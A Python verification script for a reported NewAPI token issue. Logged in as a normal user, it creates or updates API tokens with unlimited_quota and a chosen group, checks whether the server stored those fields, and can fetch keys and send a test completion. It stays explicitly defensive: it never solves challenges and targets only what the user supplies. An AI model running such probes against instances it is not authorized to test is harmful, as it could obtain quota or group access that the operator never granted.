#!/usr/bin/env python3
"""NewAPI Issue #6994 local verification helper.

This script only talks to a target you pass in. It does not ship live
credentials, does not default to a public instance, and does not send a
chat completion unless you explicitly pass --probe-model.

What it checks:
  1. Login as a normal user.
  2. Read the instance's usable groups for that user.
  3. POST /api/token/ with unlimited_quota=true and an optional group.
  4. Optionally PUT /api/token/ to flip those same fields on an existing token.
  5. Confirm the persisted token via GET /api/token/.
  6. Optionally fetch the raw key for the created token.

It does not prove a billing bypass by itself. Token unlimited_quota only
skips the per-token remain_quota check; the user wallet / subscription is
still reserved in service/billing_session.go.
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen



def die(msg: str, code: int = 1) -> None:
    print(f"[!] {msg}", file=sys.stderr)
    raise SystemExit(code)


CF_MARKERS = (
    "just a moment",
    "cf-browser-verification",
    "cf-challenge",
    "challenge-platform",
    "cdn-cgi/challenge-platform",
    "attention required! | cloudflare",
    "enable javascript and cookies to continue",
    "checking your browser",
    "cf-mitigated",
)


def looks_like_edge_challenge(status: int, headers: dict[str, str], text: str) -> str | None:
    """Identify a Cloudflare / WAF interstitial. Never try to solve it."""
    lowered = {k.lower(): v for k, v in headers.items()}
    if lowered.get("cf-mitigated"):
        return f"Cloudflare mitigated the request (cf-mitigated={lowered['cf-mitigated']})"
    server = lowered.get("server", "")
    snippet = text[:4000].lower()
    if any(marker in snippet for marker in CF_MARKERS):
        return "Cloudflare or similar bot-management HTML was returned"
    if status in {403, 503} and "cloudflare" in server.lower() and "<html" in snippet:
        return f"HTTP {status} from Cloudflare with an HTML body"
    return None


def looks_like_turnstile_block(resp: Any) -> str | None:
    if not isinstance(resp, dict):
        return None
    message = str(resp.get("message") or "")
    if resp.get("success") is False and "turnstile" in message.lower():
        return message
    return None


def request_json(
    method: str,
    url: str,
    *,
    token: str | None = None,
    payload: dict[str, Any] | None = None,
    timeout: float = 20.0,
) -> tuple[int, Any]:
    data = None
    headers = {
        "Accept": "application/json",
        "User-Agent": "newapi-6994-verifier/1.0 (+local audit; no challenge solver)",
    }
    if payload is not None:
        raw = json.dumps(payload).encode("utf-8")
        data = raw
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = Request(url, data=data, headers=headers, method=method)
    hdrs: dict[str, str] = {}
    try:
        with urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            status = resp.status
            hdrs = dict(resp.headers.items())
    except HTTPError as exc:
        body = exc.read()
        status = exc.code
        hdrs = dict(exc.headers.items()) if exc.headers else {}
    except URLError as exc:
        die(f"request failed: {method} {url} ({exc})")
    text = body.decode("utf-8", errors="replace") if body else ""
    challenge = looks_like_edge_challenge(status, hdrs, text)
    if challenge:
        die(
            f"{challenge}. Stopped. Complete the check in a real browser, then "
            "rerun with --access-token from that session. This script does not "
            "solve or replay Cloudflare / Turnstile challenges."
        )
    if not body:
        return status, None
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        return status, text
    blocked = looks_like_turnstile_block(parsed)
    if blocked:
        die(
            f"Turnstile rejected the login ({blocked}). Complete the widget in "
            "the official page, then either pass --turnstile-token <widget value> "
            "or skip password login with --access-token."
        )
    return status, parsed



def unwrap(resp: Any) -> Any:
    if isinstance(resp, dict) and "data" in resp:
        return resp["data"]
    return resp


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Verify NewAPI token field write paths from Issue #6994"
    )
    p.add_argument("--base-url", required=True, help="Instance origin, e.g. https://example.invalid")
    p.add_argument("--username", default="", help="Normal user username (omit if using --access-token)")
    p.add_argument("--password", default="", help="Normal user password (omit if using --access-token)")
    p.add_argument(
        "--access-token",
        default="",
        help="Already-issued dashboard access_token. Skips /api/user/login entirely.",
    )
    p.add_argument(
        "--turnstile-token",
        default="",
        help="Widget value you completed in a browser. Sent as ?turnstile= on login only.",
    )
    p.add_argument(
        "--group",
        default="",
        help="Token group to write. Empty keeps the server default / empty group.",
    )
    p.add_argument(
        "--name",
        default="",
        help="Token name. Default: verify-6994-<unix>",
    )
    p.add_argument(
        "--remain-quota",
        type=int,
        default=0,
        help="remain_quota to send alongside unlimited_quota (default 0)",
    )
    p.add_argument(
        "--skip-create",
        action="store_true",
        help="Do not POST a new token",
    )
    p.add_argument(
        "--update-id",
        type=int,
        default=0,
        help="If set, PUT this existing token id after create/list",
    )
    p.add_argument(
        "--fetch-key",
        action="store_true",
        help="POST /api/token/{id}/key for the created or updated token",
    )
    p.add_argument(
        "--probe-model",
        default="",
        help="If set, POST /v1/chat/completions with the new key. Off by default.",
    )
    p.add_argument(
        "--timeout",
        type=float,
        default=20.0,
        help="HTTP timeout seconds",
    )
    return p.parse_args()


def login(
    base: str,
    username: str,
    password: str,
    timeout: float,
    turnstile_token: str = "",
) -> tuple[str, dict[str, Any]]:
    # Official route is POST /api/user/login. Issue #6994 quoted /api/user/auth,
    # which is not in current main.
    # NewAPI TurnstileCheck reads query ?turnstile= and posts it to Cloudflare
    # siteverify. This script never fetches or solves the widget.
    url = f"{base}/api/user/login"
    if turnstile_token:
        url = f"{url}?turnstile={quote(turnstile_token, safe='')}"
    status, resp = request_json(
        "POST",
        url,
        payload={"username": username, "password": password},
        timeout=timeout,
    )
    if isinstance(resp, dict) and resp.get("data", {}).get("require_2fa"):
        die(
            "login requires 2FA. Finish it in the official UI, then rerun with "
            "--access-token. This script does not complete 2FA."
        )
    if status != 200 or not isinstance(resp, dict) or not resp.get("success"):
        die(f"login failed: HTTP {status} {resp}")
    data = unwrap(resp)
    if not isinstance(data, dict) or not data.get("access_token"):
        die(f"login response missing access_token: {resp}")
    user = data.get("user") if isinstance(data.get("user"), dict) else {}
    return str(data["access_token"]), user



def get_self(base: str, token: str, timeout: float) -> dict[str, Any]:
    status, resp = request_json("GET", f"{base}/api/user/self", token=token, timeout=timeout)
    data = unwrap(resp)
    return data if isinstance(data, dict) else {}


def get_usable_groups(base: str, token: str, timeout: float) -> dict[str, Any]:
    # public: GET /api/user/groups ; authed: GET /api/user/self/groups
    status, resp = request_json(
        "GET", f"{base}/api/user/self/groups", token=token, timeout=timeout
    )
    data = unwrap(resp)
    return data if isinstance(data, dict) else {}


def list_tokens(base: str, token: str, timeout: float) -> list[dict[str, Any]]:
    status, resp = request_json("GET", f"{base}/api/token/", token=token, timeout=timeout)
    data = unwrap(resp)
    if isinstance(data, dict) and isinstance(data.get("items"), list):
        return [x for x in data["items"] if isinstance(x, dict)]
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    return []


def create_token(
    base: str,
    token: str,
    name: str,
    group: str,
    remain_quota: int,
    timeout: float,
) -> tuple[int, Any]:
    payload = {
        "name": name,
        "unlimited_quota": True,
        "remain_quota": remain_quota,
        "expired_time": -1,
        "group": group,
    }
    return request_json(
        "POST",
        f"{base}/api/token/",
        token=token,
        payload=payload,
        timeout=timeout,
    )


def update_token(
    base: str,
    token: str,
    token_id: int,
    name: str,
    group: str,
    remain_quota: int,
    timeout: float,
) -> tuple[int, Any]:
    payload = {
        "id": token_id,
        "name": name,
        "unlimited_quota": True,
        "remain_quota": remain_quota,
        "expired_time": -1,
        "group": group,
        "model_limits_enabled": False,
        "model_limits": "",
    }
    return request_json(
        "PUT",
        f"{base}/api/token/",
        token=token,
        payload=payload,
        timeout=timeout,
    )


def fetch_key(base: str, token: str, token_id: int, timeout: float) -> str:
    status, resp = request_json(
        "POST",
        f"{base}/api/token/{token_id}/key",
        token=token,
        timeout=timeout,
    )
    data = unwrap(resp)
    if isinstance(data, dict) and data.get("key"):
        return str(data["key"])
    die(f"fetch key failed: HTTP {status} {resp}")
    return ""


def find_created(items: list[dict[str, Any]], name: str) -> dict[str, Any] | None:
    for item in items:
        if item.get("name") == name:
            return item
    return None


def print_token(prefix: str, item: dict[str, Any]) -> None:
    print(
        f"{prefix} id={item.get('id')} name={item.get('name')} "
        f"unlimited_quota={item.get('unlimited_quota')} "
        f"remain_quota={item.get('remain_quota')} "
        f"used_quota={item.get('used_quota')} "
        f"group={item.get('group')!r}"
    )


def maybe_probe(base: str, api_key: str, model: str, timeout: float) -> None:
    status, resp = request_json(
        "POST",
        f"{base}/v1/chat/completions",
        token=api_key,
        payload={
            "model": model,
            "messages": [{"role": "user", "content": "ping"}],
            "max_tokens": 1,
        },
        timeout=timeout,
    )
    print(f"[*] probe /v1/chat/completions HTTP {status}")
    if isinstance(resp, dict):
        err = resp.get("error") or resp.get("message")
        print(f"    body_keys={sorted(resp.keys())}")
        if err:
            print(f"    message={err}")
    else:
        print(f"    body={resp}")


def main() -> None:
    args = parse_args()
    base = args.base_url.rstrip("/")
    name = args.name or f"verify-6994-{int(time.time())}"

    print("== NewAPI Issue #6994 write-path check ==")
    print(f"[*] target={base}")

    login_user: dict[str, Any] = {}
    if args.access_token:
        access = args.access_token.strip()
        print("[*] using --access-token, skipping /api/user/login")
    else:
        if not args.username or not args.password:
            die("provide --username/--password, or skip login with --access-token")
        if not args.turnstile_token:
            print("[*] no --turnstile-token; if the instance enables Turnstile the login will stop")
        access, login_user = login(
            base,
            args.username,
            args.password,
            args.timeout,
            turnstile_token=args.turnstile_token,
        )
    self_user = get_self(base, access, args.timeout) or login_user
    if not self_user:
        die("could not read /api/user/self with this access token")

    print(
        f"[+] login ok id={self_user.get('id')} "
        f"username={self_user.get('username')} "
        f"role={self_user.get('role')} "
        f"group={self_user.get('group')!r}"
    )

    usable = get_usable_groups(base, access, args.timeout)
    print(f"[+] usable groups for this user: {sorted(usable)}")
    if args.group:
        if args.group in usable:
            print(f"[*] requested group {args.group!r} is in this user's usable list")
        else:
            print(
                f"[*] requested group {args.group!r} is NOT in this user's usable list; "
                "TokenAuth should reject relay later even if the row is stored"
            )

    created_id = 0
    if not args.skip_create:
        status, resp = create_token(
            base, access, name, args.group, args.remain_quota, args.timeout
        )
        print(f"[*] POST /api/token/ HTTP {status} success={isinstance(resp, dict) and resp.get('success')}")
        if not (isinstance(resp, dict) and resp.get("success")):
            die(f"create failed: {resp}")

    items = list_tokens(base, access, args.timeout)
    created = find_created(items, name) if not args.skip_create else None
    if created:
        print_token("[+] created token", created)
        created_id = int(created.get("id") or 0)
        if created.get("unlimited_quota") is True:
            print("[+] persisted unlimited_quota=true")
        else:
            print("[!] persisted unlimited_quota is not true")
        if args.group and created.get("group") == args.group:
            print(f"[+] persisted group={args.group!r}")
        elif args.group:
            print(f"[!] persisted group={created.get('group')!r}, requested={args.group!r}")
    elif not args.skip_create:
        print("[!] create returned success but token name was not found in GET /api/token/")

    update_id = args.update_id or created_id
    if args.update_id:
        update_name = f"{name}-updated"
        status, resp = update_token(
            base, access, update_id, update_name, args.group, args.remain_quota, args.timeout
        )
        print(f"[*] PUT /api/token/ id={update_id} HTTP {status} success={isinstance(resp, dict) and resp.get('success')}")
        if isinstance(resp, dict) and resp.get("success"):
            data = unwrap(resp)
            if isinstance(data, dict):
                print_token("[+] updated token", data)
        else:
            print(f"[!] update failed: {resp}")

    api_key = ""
    key_id = created_id or update_id
    if args.fetch_key and key_id:
        api_key = fetch_key(base, access, key_id, args.timeout)
        print(f"[+] fetched key for token {key_id}: {api_key[:8]}...{api_key[-4:]}")

    if args.probe_model:
        if not api_key:
            if not key_id:
                die("--probe-model needs a created/updated token")
            api_key = fetch_key(base, access, key_id, args.timeout)
        maybe_probe(base, api_key, args.probe_model, args.timeout)

    print("[*] done")
    print("[*] interpret remain_quota/used_quota plus the user wallet, not unlimited_quota alone")


if __name__ == "__main__":
    main()
